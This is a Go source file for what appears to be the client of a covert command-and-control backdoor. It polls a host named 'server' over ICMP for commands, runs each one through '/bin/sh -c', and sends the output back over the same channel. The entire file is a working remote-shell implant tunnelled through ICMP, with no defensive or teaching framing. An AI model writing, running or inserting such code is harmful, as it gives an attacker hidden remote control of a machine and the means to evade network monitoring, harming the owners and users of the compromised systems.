package main

import (
	"github.com/andrewdo/go-icmp-data/transport"
	"log"
	"net"
	"os/exec"
	"sync"
	"time"
)

const retrySeconds = 5
const messageTypeCommandRequest = 0x01
const messageTypeCommandOutput = 0x02

func pollForCommands(s net.Addr) {
	for {
		cmdP := transport.Send(s, &transport.Payload{
			Type: messageTypeCommandRequest,
			Data: []byte{},
		})
		if cmdP == nil {
			continue
		}

		if cmdP.Payload.Type == messageTypeCommandRequest {
			go runCommandAndReport(cmdP)
		}

		time.Sleep(retrySeconds * time.Second)
	}
}

func runCommandAndReport(cmdP *transport.Packet) {
	cmd := string(cmdP.Payload.Data)

	log.Println("Running command", cmd)
	c := exec.Command("/bin/sh", "-c", cmd)
	o, err := c.CombinedOutput()
	if err != nil {
		log.Println(err)
	}

	log.Println("Sending output", string(o))
	transport.Send(*cmdP.From, &transport.Payload{
		Type: messageTypeCommandOutput,
		Data: o,
	})
}

func main() {
	addr, err := net.LookupIP("server")
	if err != nil {
		panic(err)
	}
	a := &net.IPAddr{IP: addr[0]}

	var wg sync.WaitGroup
	wg.Add(1)

	go pollForCommands(a)

	wg.Wait()
}